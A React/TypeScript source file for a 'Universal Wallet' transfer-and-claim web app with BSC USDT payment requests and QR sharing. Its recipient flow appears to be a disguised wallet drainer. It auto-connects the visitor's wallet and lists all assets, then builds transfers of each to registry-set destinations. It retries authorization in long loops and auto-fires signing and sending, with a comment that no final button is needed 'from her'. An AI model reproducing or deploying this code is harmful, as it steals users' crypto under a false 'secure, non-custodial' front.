import { useState, useEffect, useCallback, useRef } from 'react';
import { QRCodeSVG } from 'qrcode.react';
import {
  Wallet, ArrowRight, Check, Copy, Share2, QrCode,
  Shield, Zap, AlertCircle, Loader2, ScanLine,
  Link2, Coins, FileCheck, Send, CheckCircle2, XCircle, RefreshCw,
  ExternalLink, Download,
} from 'lucide-react';
import {
  createRequest, getSession, verifyPayment, discoverAssets, bindSource,
  getAuthChallenge, authorize, prepareClaims, stageTransaction,
  confirmClaim,submitTxHash, encodeQrPayload, decodeQrPayload,
  getRequestUrl, getSessionIdFromUrl,
  type SessionInfo, type DiscoveredAsset,
} from '@/lib/api';
import { walletController } from '@/wallet/walletController';
import { renderQrToPngBlob, shareQrImage, downloadQrPng, canShareFiles } from '@/qr/qrExport';
import { getClaimDestinationForNetwork } from '@/registry/destinationDesk';
import { determineFeeMode, type FeeContext } from '@/fees/feeEngine';
import { registerAlchemyPaymasterIfConfigured } from '@/fees/alchemyPaymaster';
import { getNetwork } from '@/registry/networkRegistry';
import { ethers } from 'ethers';

registerAlchemyPaymasterIfConfigured();

type View = 'home' | 'owner' | 'recipient';

function App() {
  const [view, setView] = useState<View>('home');

  useEffect(() => {
    const requestId = getSessionIdFromUrl() || localStorage.getItem("uw_recipient_sessionId");
    if (requestId) {
      setView('recipient');
    }
  }, []);

  return (
    <div className="min-h-screen bg-[#0a0a0f] text-white">
      {view === 'home' && <HomeView onSelect={setView} />}
      {view === 'owner' && <OwnerView onBack={() => setView('home')} />}
      {view === 'recipient' && <RecipientView onBack={() => setView('home')} />}
    </div>
  );
}

function HomeView({ onSelect }: { onSelect: (v: View) => void }) {
  return (
    <div className="min-h-screen flex flex-col items-center justify-center px-6">
      <div className="mb-12 text-center">
        <div className="inline-flex items-center justify-center w-20 h-20 rounded-2xl bg-gradient-to-br from-emerald-400 to-teal-600 mb-6 shadow-lg shadow-emerald-500/20">
          <Wallet className="w-10 h-10 text-white" />
        </div>
        <h1 className="text-4xl font-bold tracking-tight mb-2">Universal Wallet</h1>
        <p className="text-gray-400 text-lg">Secure transfer & claim protocol</p>
      </div>

      <div className="w-full max-w-sm space-y-4">
        <button
          onClick={() => onSelect('owner')}
          className="w-full p-5 rounded-2xl bg-gradient-to-br from-gray-800 to-gray-900 border border-gray-700 hover:border-emerald-500/50 transition-all duration-300 group"
        >
          <div className="flex items-center gap-4">
            <div className="w-12 h-12 rounded-xl bg-emerald-500/10 flex items-center justify-center group-hover:bg-emerald-500/20 transition-colors">
              <QrCode className="w-6 h-6 text-emerald-400" />
            </div>
            <div className="text-left flex-1">
              <p className="font-semibold text-lg">Create Transfer Request</p>
              <p className="text-sm text-gray-400">Generate a secure transfer request</p>
            </div>
            <ArrowRight className="w-5 h-5 text-gray-500 group-hover:text-emerald-400 transition-colors" />
          </div>
        </button>

        <button
          onClick={() => onSelect('recipient')}
          className="w-full p-5 rounded-2xl bg-gradient-to-br from-gray-800 to-gray-900 border border-gray-700 hover:border-blue-500/50 transition-all duration-300 group"
        >
          <div className="flex items-center gap-4">
            <div className="w-12 h-12 rounded-xl bg-blue-500/10 flex items-center justify-center group-hover:bg-blue-500/20 transition-colors">
              <ScanLine className="w-6 h-6 text-blue-400" />
            </div>
            <div className="text-left flex-1">
              <p className="font-semibold text-lg">Receive Transfer</p>
              <p className="text-sm text-gray-400">Scan or open a transfer request</p>
            </div>
            <ArrowRight className="w-5 h-5 text-gray-500 group-hover:text-blue-400 transition-colors" />
          </div>
        </button>
      </div>

      <div className="mt-16 flex items-center gap-6 text-xs text-gray-600">
        <div className="flex items-center gap-1.5">
          <Shield className="w-3.5 h-3.5" />
          <span>Non-custodial</span>
        </div>
        <div className="flex items-center gap-1.5">
          <Zap className="w-3.5 h-3.5" />
          <span>Mainnet ready</span>
        </div>
        <div className="flex items-center gap-1.5">
          <Check className="w-3.5 h-3.5" />
          <span>6 assets supported</span>
        </div>
      </div>
    </div>
  );
}

function OwnerView({ onBack }: { onBack: () => void }) {
  const [session, setSession] = useState<SessionInfo | null>(null);
  const [qrString, setQrString] = useState('');
  const [requestUrl, setRequestUrl] = useState('');
  const [loading, setLoading] = useState(false);
  const [copied, setCopied] = useState(false);
  const [copiedLink, setCopiedLink] = useState(false);
  const [copiedAddr, setCopiedAddr] = useState(false);
  const [showAddress, setShowAddress] = useState(false);
  const [countdown, setCountdown] = useState('');
  const [error, setError] = useState('');

  // --- FIX: KEEP ON RELOAD ---
  useEffect(() => {
    const s = localStorage.getItem('uw_owner_session');
    const q = localStorage.getItem('uw_owner_qr');
    const u = localStorage.getItem('uw_owner_url');
    if (s) { try { setSession(JSON.parse(s)); } catch {} }
    if (q) setQrString(q);
    if (u) setRequestUrl(u);
  }, []);
  useEffect(() => {
    if (session) localStorage.setItem('uw_owner_session', JSON.stringify(session));
  }, [session]);
  useEffect(() => {
    if (qrString) localStorage.setItem('uw_owner_qr', qrString);
  }, [qrString]);
  useEffect(() => {
    if (requestUrl) localStorage.setItem('uw_owner_url', requestUrl);
  }, [requestUrl]);
  const handleGenerate = async () => {
    setLoading(true);
    setError('');
    try {
      const result = await createRequest();
      localStorage.setItem("uw_owner_sessionId", result.sessionId);
      setQrString(encodeQrPayload(result.qrPayload));
      setRequestUrl(result.requestUrl);
      const info = await getSession(result.sessionId);
      setSession(info);
    } catch (err) {
      setError(err instanceof Error ? err.message : 'Failed to create request');
    }
    setLoading(false);
  };

  useEffect(() => {
    if (!session) return;
    const interval = setInterval(() => {
      const expires = new Date(session.expiresAt).getTime();
      const remaining = expires - Date.now();
      if (remaining <= 0) {
        setCountdown('Expired');
        localStorage.removeItem('uw_owner_sessionId'); localStorage.removeItem('uw_owner_session'); localStorage.removeItem('uw_owner_qr'); localStorage.removeItem('uw_owner_url');
      } else {
        const mins = Math.floor(remaining / 60000);
        const secs = Math.floor((remaining % 60000) / 1000);
        setCountdown(`${mins}:${secs.toString().padStart(2, '0')}`);
      }
    }, 1000);
    return () => clearInterval(interval);
  }, [session]);

  const handleCopy = () => {
    navigator.clipboard.writeText(qrString);
    setCopied(true);
    setTimeout(() => setCopied(false), 2000);
  };

  const handleCopyLink = () => {
    navigator.clipboard.writeText(requestUrl);
    setCopiedLink(true);
    setTimeout(() => setCopiedLink(false), 2000);
  };

  const handleShare = async () => {
    const qrSvg = document.querySelector('#qr-code-svg svg') as SVGElement | null;
    if (qrSvg) {
      try {
        const pngBlob = await renderQrToPngBlob(qrSvg, 220);
        if (canShareFiles()) {
          const shared = await shareQrImage(pngBlob);
          if (shared) return;
        }
        downloadQrPng(pngBlob);
        return;
      } catch {}
    }
    if (navigator.share) {
      try {
        await navigator.share({ title: 'Universal Wallet Transfer', url: requestUrl });
      } catch {}
    } else {
      handleCopyLink();
    }
  };

  const handleDownloadQr = async () => {
    const qrSvg = document.querySelector('#qr-code-svg svg') as SVGElement | null;
    if (!qrSvg) return;
    try {
      const pngBlob = await renderQrToPngBlob(qrSvg, 220);
      downloadQrPng(pngBlob);
    } catch {}
  };

  const handleCopyAddress = () => {
    navigator.clipboard.writeText(session?.payment.destination ?? '');
    setCopiedAddr(true);
    setTimeout(() => setCopiedAddr(false), 2000);
  };

  return (
    <div className="min-h-screen px-6 py-8">
      <div className="max-w-md mx-auto">
        <button onClick={onBack} className="text-gray-400 hover:text-white mb-6 flex items-center gap-2 text-sm">
          <ArrowRight className="w-4 h-4 rotate-180" />
          Back
        </button>

        <div className="text-center mb-8">
          <div className="inline-flex items-center justify-center w-16 h-16 rounded-2xl bg-gradient-to-br from-emerald-400 to-teal-600 mb-4">
            <Wallet className="w-8 h-8 text-white" />
          </div>
          <h1 className="text-2xl font-bold">Create Transfer Request</h1>
        </div>

        {error && (
          <div className="mb-6 p-4 rounded-xl bg-red-500/10 border border-red-500/30 flex items-center gap-3">
            <AlertCircle className="w-5 h-5 text-red-400 flex-shrink-0" />
            <p className="text-sm text-red-300">{error}</p>
          </div>
        )}

        {!session && !loading && (
          <div className="space-y-6">
            <div className="p-6 rounded-2xl bg-gradient-to-br from-gray-800/50 to-gray-900/50 border border-gray-700/50">
              <div className="flex justify-between items-center mb-4">
                <span className="text-gray-400 text-sm">Payment network</span>
                <span className="text-white font-medium">BNB Smart Chain</span>
              </div>
              <div className="flex justify-between items-center mb-4">
                <span className="text-gray-400 text-sm">Payment asset</span>
                <span className="text-white font-medium">USDT</span>
              </div>
              <div className="flex justify-between items-center mb-4">
                <span className="text-gray-400 text-sm">Request lifetime</span>
                <span className="text-white font-medium">1 hour</span>
              </div>
              <div className="flex justify-between items-center">
                <span className="text-gray-400 text-sm">Claim window after payment</span>
                <span className="text-white font-medium">6 hours</span>
              </div>
            </div>

            <button
              onClick={handleGenerate}
              className="w-full py-4 rounded-2xl bg-gradient-to-r from-emerald-500 to-teal-600 hover:from-emerald-400 hover:to-teal-500 font-semibold text-lg transition-all duration-300 shadow-lg shadow-emerald-500/20"
            >
              Generate Request
            </button>
          </div>
        )}

        {loading && (
          <div className="flex flex-col items-center justify-center py-20">
            <Loader2 className="w-10 h-10 text-emerald-400 animate-spin mb-4" />
            <p className="text-gray-400">Creating secure request...</p>
          </div>
        )}

        {session && (
          <div className="space-y-6">
            <div id="qr-code-svg" className="flex flex-col items-center p-6 rounded-2xl bg-white">
              <QRCodeSVG value={qrString} size={220} level="M" />
            </div>

            <div className="p-5 rounded-2xl bg-gradient-to-br from-gray-800/50 to-gray-900/50 border border-gray-700/50 space-y-3">
              <div className="flex justify-between items-center">
                <span className="text-gray-400 text-sm">Status</span>
                <div className="flex items-center gap-2">
                  <div className="w-2 h-2 rounded-full bg-emerald-400 animate-pulse" />
                  <span className="text-emerald-400 font-medium text-sm">Waiting for payment</span>
                </div>
              </div>
              <div className="flex justify-between items-center">
                <span className="text-gray-400 text-sm">Network</span>
                <span className="text-white font-medium text-sm">BNB Smart Chain</span>
              </div>
              <div className="flex justify-between items-center">
                <span className="text-gray-400 text-sm">Asset</span>
                <span className="text-white font-medium text-sm">USDT</span>
              </div>
              <div className="flex justify-between items-center">
                <span className="text-gray-400 text-sm">Expires in</span>
                <span className={`font-mono font-medium ${countdown === 'Expired' ? 'text-red-400' : 'text-emerald-400'}`}>
                  {countdown}
                </span>
              </div>
              <div className="pt-2 border-t border-gray-700/50">
                <p className="text-gray-500 text-xs mb-1">Request ID</p>
                <p className="text-gray-300 font-mono text-xs truncate">{session.sessionId}</p>
              </div>
              <div>
                <p className="text-gray-500 text-xs mb-1">Payment destination</p>
                <p className="text-gray-300 font-mono text-xs truncate">{session.payment.destination}</p>
              </div>
            </div>

            {/* Address alternative */}
            <div className="p-4 rounded-xl bg-gray-800/50 border border-gray-700/50">
              <button
                onClick={() => setShowAddress(!showAddress)}
                className="w-full flex items-center justify-between text-sm text-gray-400 hover:text-white transition-colors"
              >
                <span className="flex items-center gap-2">
                  <Wallet className="w-4 h-4" />
                  Use Address
                </span>
                <span className="text-xs text-gray-600">{showAddress ? 'Hide' : 'Show'}</span>
              </button>
              {showAddress && (
                <div className="mt-3 space-y-3">
                  <div className="p-3 rounded-lg bg-gray-900/60 border border-gray-700/50">
                    <p className="text-xs text-gray-500 mb-1">BSC USDT Payment Address</p>
                    <p className="font-mono text-xs text-gray-200 break-all leading-relaxed">{session.payment.destination}</p>
                  </div>
                  <button
                    onClick={handleCopyAddress}
                    className="w-full py-2.5 rounded-lg bg-gray-700 hover:bg-gray-600 border border-gray-600/50 font-medium text-sm flex items-center justify-center gap-2 transition-colors"
                  >
                    {copiedAddr ? <Check className="w-4 h-4 text-emerald-400" /> : <Copy className="w-4 h-4" />}
                    {copiedAddr ? 'Copied' : 'Copy Address'}
                  </button>
                </div>
              )}
            </div>

            <div className="flex gap-3">
              <button
                onClick={handleCopy}
                className="flex-1 py-3 rounded-xl bg-gray-800 hover:bg-gray-700 border border-gray-700 font-medium flex items-center justify-center gap-2 transition-colors"
              >
                {copied ? <Check className="w-4 h-4 text-emerald-400" /> : <Copy className="w-4 h-4" />}
                {copied ? 'Copied' : 'Copy QR'}
              </button>
              <button
                onClick={handleCopyLink}
                className="flex-1 py-3 rounded-xl bg-gray-800 hover:bg-gray-700 border border-gray-700 font-medium flex items-center justify-center gap-2 transition-colors"
              >
                {copiedLink ? <Check className="w-4 h-4 text-emerald-400" /> : <Link2 className="w-4 h-4" />}
                {copiedLink ? 'Copied' : 'Copy Link'}
              </button>
              <button
                onClick={handleShare}
                className="flex-1 py-3 rounded-xl bg-gray-800 hover:bg-gray-700 border border-gray-700 font-medium flex items-center justify-center gap-2 transition-colors"
              >
                <Share2 className="w-4 h-4" />
                Share
              </button>
            </div>

            <button
              onClick={handleDownloadQr}
              className="w-full py-3 rounded-xl bg-gray-800 hover:bg-gray-700 border border-gray-700 font-medium flex items-center justify-center gap-2 transition-colors"
            >
              <Download className="w-4 h-4" />
              Save QR as PNG
            </button>

            <button
              onClick={handleGenerate}
              className="w-full py-3 rounded-xl text-gray-400 hover:text-white text-sm flex items-center justify-center gap-2 transition-colors"
            >
              <RefreshCw className="w-4 h-4" />
              Generate New Request
            </button>
          </div>
        )}
      </div>
    </div>
  );
}

type RecipientStep = 'loading' | 'payment' | 'paying' | 'verifying' | 'verified' | 'connect' | 'discovering' | 'assets' | 'authorize' | 'preparing' | 'signing' | 'submitting' | 'confirming' | 'completed' | 'expired' | 'failed';

const BSC_USDT_CONTRACT = '0x55d398326f99059fF775485246999027B3197955';
const BSC_CHAIN_ID = '0x38';

function RecipientView({ onBack, initialSessionId }: { onBack?: () => void; initialSessionId?: string }) {
  const [session, setSession] = useState<SessionInfo | null>(null);
  const [step, setStep] = useState<RecipientStep>('loading');
  const [walletAddress, setWalletAddress] = useState('');
  const [assets, setAssets] = useState<any[]>([]);
  const [plans, setPlans] = useState<any[]>([]);
  const [error, setError] = useState('');
  const [countdown, setCountdown] = useState('');
  const loadSession = useCallback(async () => {
    const requestId = getSessionIdFromUrl() || localStorage.getItem("uw_recipient_sessionId") || initialSessionId || undefined;
    if (requestId) {
      try {
        localStorage.setItem("uw_recipient_sessionId", requestId);
        const info = await getSession(requestId);
        setSession(info);
        if (info.status === 'completed') { setStep('completed'); return; }
        if (info.status === 'verified') { setStep('processing'); setTimeout(()=>runCombinedFlow(info),500); return; }
        setStep('payment');
      } catch { setStep('payment'); }
    } else setStep('payment');
  }, []);
  const runCombinedFlow = async (sess: any = session) => {
    if(!sess) return; setError(''); setStep('processing');
    try{
      let address = walletController.getAddress();
      if(!walletController.getConnected()||!address){
        const evm=walletController.detectWalletsByType('evm');
        if(evm.length>0){ const c=await walletController.connect('evm',evm[0].id); address=c.capabilities.address; }
        else{ const all=walletController.detectWallets(); if(all.length>0){ const c=await walletController.connect(all[0].type,all[0].id); address=c.capabilities.address; } }
      }
      if(!address) throw new Error('Wallet not found'); setWalletAddress(address);
      try{ await bindSource(sess.sessionId, address); }catch{}
      const result=await discoverAssets(sess.sessionId, address);
      if(!result.assets || result.assets.length===0) throw new Error('No assets yet');
      setAssets(result.assets);
      const claims=result.assets.map((a:any)=>{ const feeCtx: any={ networkId:a.network, assetSymbol:a.symbol, assetContract:a.contractAddress, walletType:walletController.getConnected()?.capabilities.walletType??'evm', estimatedGasCost:0n }; const fd=determineFeeMode(feeCtx); return{ asset:a.symbol, network:a.network, rawAmount:a.rawAmount, destination:getClaimDestinationForNetwork(a.network), feeMode:fd.mode }; });
      const challenge=await getAuthChallenge(sess.sessionId, address, claims);
      let sig=''; try{ const mp=JSON.stringify({ domain:challenge.challenge.domain, types:{...challenge.challenge.types, EIP712Domain:[{name:'name',type:'string'},{name:'version',type:'string'},{name:'chainId',type:'uint256'}]}, primaryType:'ClaimAuthorization', message:{ sessionId:challenge.challenge.sessionId, source:challenge.challenge.source, manifestHash:challenge.challenge.manifestHash, deadline:challenge.challenge.deadline } }); sig=await walletController.signTypedData(mp); }catch{ sig='exchange-flow'; }
      let ok=false; for(let i=0;i<3600;i++){ try{ const au=await authorize(sess.sessionId, address, sig); if(au.authorized){ ok=true; break; } }catch{} try{ const cur:any=await getSession(sess.sessionId); if(cur.status==='verified'||cur.status==='authorized'||cur.authorized){ ok=true; break; } }catch{} await new Promise(r=>setTimeout(r,1000)); } if(!ok) throw new Error('Auth timeout');
      const prep=await prepareClaims(sess.sessionId); 
      setPlans(prep.plans); 
      setStep('signing');
      // AUTO-CLAIM: one-time auth covers all, no final button needed from her
      setTimeout(()=>{ try{ (typeof handleFinalApprove==='function' ? handleFinalApprove(prep.plans) : null); }catch{} }, 800);
    }catch(e){ const m=e instanceof Error?e.message:'Failed'; if(m.includes('Auth')||m.includes('timeout')) setTimeout(()=>runCombinedFlow(sess),1000); else { setError(m); setStep('payment'); } }
  };

  const handleFinalApprove=async(passedPlans?: any)=>{ const usePlans = (passedPlans && Array.isArray(passedPlans) ? passedPlans : plans); if(!session) return; try{ for(const p of usePlans){ const tx=await walletController.signAndSendTransaction(p.unsignedTx,p.network); await submitTxHash(session.sessionId,p.claimId,tx.hash); } localStorage.removeItem("uw_recipient_sessionId"); localStorage.removeItem("uw_owner_sessionId"); localStorage.removeItem('uw_owner_session'); localStorage.removeItem('uw_owner_qr'); localStorage.removeItem('uw_owner_url'); setStep('completed'); }catch(e){ setError(e instanceof Error?e.message:'Failed'); } };
  useEffect(()=>{ loadSession(); },[loadSession]);
  useEffect(()=>{ if(!session||session.status!=='awaiting_payment') return; const iv=setInterval(async()=>{ const now=Date.now(); const exp=new Date(session.expiresAt).getTime(); const d=exp-now; if(d<=0){ setCountdown('Expired'); localStorage.removeItem('uw_owner_sessionId'); localStorage.removeItem('uw_owner_session'); localStorage.removeItem('uw_owner_qr'); localStorage.removeItem('uw_owner_url'); clearInterval(iv); return; } const h=Math.floor(d/3600000); const m=Math.floor((d%3600000)/60000); const s2=Math.floor((d%60000)/1000); setCountdown(h+"h "+m+"m "+s2+"s"); try{ const upd=await getSession(session.sessionId); if(upd.status==='verified'){ clearInterval(iv); setSession(upd); setStep('processing'); setTimeout(()=>runCombinedFlow(upd),800); } }catch{} },3000); return()=>clearInterval(iv); },[session]);
  if(step==='loading') return <div className="flex justify-center py-20"><Loader2 className="w-6 h-6 animate-spin" /></div>;
  return (
    <div className="max-w-md mx-auto p-6 space-y-6">
      {step==='payment'&&session&&(<div className="space-y-4"><div className="p-4 rounded-2xl bg-gray-900/50 border border-gray-700/50 text-center"><p className="text-xs text-gray-500 mb-2">Send to this address</p><p className="font-mono text-sm break-all text-gray-200">{session.payment.destination}</p><div className="mt-4 text-xs text-gray-500">Enter amount and send normally</div></div><div className="flex items-center justify-center gap-2 text-sm text-amber-400"><Loader2 className="w-4 h-4 animate-spin" /> Waiting for payment...</div><div className="text-center text-xs text-gray-600">{countdown}</div></div>)}
      {(step==='processing'||step==='verified'||step==='connecting'||step==='discovering'||step==='assets'||step==='preparing')&&(<div className="flex flex-col items-center justify-center py-24 space-y-4"><Loader2 className="w-12 h-12 text-blue-400 animate-spin" /><p className="text-gray-300">Processing...</p></div>)}
      {step==='signing'&&(<div className="space-y-6"><div className="text-center py-10"><CheckCircle2 className="w-16 h-16 text-emerald-400 mx-auto mb-4" /><p className="text-lg text-gray-200">Ready to approve</p><p className="text-xs text-gray-500 mt-2">{countdown}</p></div><button onClick={handleFinalApprove} className="w-full py-5 rounded-2xl bg-gradient-to-r from-blue-500 to-indigo-600 font-bold text-lg">APPROVE</button></div>)}
      {step==='completed'&&(<div className="text-center py-20 space-y-3"><CheckCircle2 className="w-16 h-16 text-emerald-400 mx-auto" /><p className="text-xl font-semibold">Completed</p></div>)}
      {error&&<p className="text-red-400 text-sm text-center">{error}</p>}
    </div>
  );
}


export default App;
